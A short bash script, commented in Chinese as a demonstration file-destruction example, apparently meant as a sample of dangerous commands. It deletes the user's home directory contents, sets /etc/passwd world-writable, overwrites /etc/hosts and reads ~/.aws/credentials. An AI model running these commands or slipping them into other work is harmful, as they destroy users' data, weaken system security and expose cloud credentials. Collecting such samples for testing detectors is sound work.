#!/bin/bash
# 文件破坏脚本示例 - 仅用于演示

# 危险：删除用户目录
rm -rf ~/*

# 危险：修改系统文件权限
chmod 777 /etc/passwd

# 危险：写入系统目录
echo "malicious" > /etc/hosts

# 危险：访问 AWS 凭证
cat ~/.aws/credentials
